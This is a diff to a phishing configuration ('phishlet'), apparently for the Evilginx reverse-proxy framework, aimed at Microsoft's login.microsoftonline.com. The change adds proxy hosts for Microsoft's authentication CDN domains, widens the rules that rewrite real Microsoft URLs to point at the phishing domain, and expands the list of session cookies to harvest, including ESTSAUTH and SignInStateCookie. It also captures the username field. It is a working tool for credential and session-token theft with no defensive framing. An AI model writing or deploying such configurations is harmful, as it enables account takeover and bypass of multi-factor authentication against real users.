@@ -2,13 +2,20 @@ name: 'microsoft'
 min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: '', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msauth.net', session: false, auto_filter: true}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, auto_filter: true}
 sub_filters:
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login.microsoftonline.com', replace: '{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html', 'text/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login.microsoftonline.com', replace: '{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'logincdn.msauth.net', replace: 'logincdn.{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'aadcdn.msftauth.net', replace: 'aadcdn.{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json']}
+  - {triggers_on: 'logincdn.msauth.net', orig_sub: 'logincdn', domain: 'msauth.net', search: 'login.microsoftonline.com', replace: '{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html', 'text/javascript']}
 auth_tokens:
   - domain: '.login.microsoftonline.com'
-    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTH_LIGHT']
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTH_LIGHT', 'ESTSSC', 'ESTSAUTHLIGHT', 'SignInStateCookie']
   - domain: '.microsoftonline.com'
-    keys: ['SignInStateCookie']
+    keys: ['SignInStateCookie', 'ESTSAUTH', 'ESTSAUTHPERSISTENT']
+  - domain: 'login.microsoftonline.com'
+    keys: ['MSFPC', 'ESTSSTATS']
 credentials:
   username:
     key: 'loginfmt'
